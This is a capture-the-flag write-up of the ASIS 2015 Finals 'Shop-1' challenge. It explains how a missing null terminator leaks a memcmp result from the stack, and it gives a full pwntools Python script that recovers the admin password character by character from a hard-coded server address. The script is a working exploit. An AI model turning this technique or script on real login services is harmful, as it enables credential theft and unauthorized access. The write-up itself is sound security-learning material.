---
layout: post
title: "ASIS 2015 Finals: Shop-1"
modified: 2015-10-14
tags: asis, asis2015finals, pwn
---

The main vulnerability for getting the admin password is that if you send in a maximum length username (32 bytes) and password (64 bytes) then no string terminating null character was written. Also, usernames and passwords were checked with memcpy and exact length instead of strcpy.

As the program prints out the logged in username this leads to leaking out the next value in the stack: the memcmp result of the admin password.

{% highlight c %}
char username[32]; // [sp+20h] [bp-70h]@3
char password[64]; // [sp+40h] [bp-50h]@3
int memcmpResult; // [sp+80h] [bp-10h]@5
{% endhighlight %}

So the attack was basically: 
 - try to login with admin and the password you leaked so far (empty at first) plus "~" (0x7e)
    - although this will lead to failed login, the memcpy result won't be cleared
    - I am using 0x7e because it is the last readable ASCII character and comparison with password will give smaller results
 - try to login with username "guest" + "A"*(32-5) and password "guest" + "A"*(64-5)
 - read the leaked value, this will be the positive difference between "~" and the next character from the password
 - logout and try again, until you found the password and can login as admin :)
 
The admin password (=flag):
{% highlight text %}
ASIS{304b0f16eb430391c6c86ab0f3294211}
{% endhighlight %}

### Exploit code

{% highlight python %}
#!/usr/bin/env python
from pwn import *
import re

adminPass = ""
foundPass = False

r = remote('185.106.120.220', 1337)

def getResult(currPass):
    global foundPass
    r.recvuntil("Username:")
    password = "guest"+"A"*(64-5)
    r.send("admin\n"+currPass+"\nguest"+"A"*(32-5)+"\n"+password+"\n8\n")
    if not "Unknown username" in r.recvline():
        foundPass = True
        return "x"

    r.recvuntil("in as guest")
    result = r.recvline()[:-1].split(password)[1]
    return result

chars = [chr(x) for x in xrange(32,127)]
print "Chars = %s" % chars

for i in xrange(45):
    result = getResult(adminPass + "~")
    if foundPass:
        break
    nextChar = chr(ord("~") - ord(result[0]))
    adminPass += nextChar
    print "found char = %s => %s (calc)" % (nextChar, adminPass)

if foundPass:
    print "Admin password = %s" % adminPass
else:
    print "Admin password not found :("
{% endhighlight %}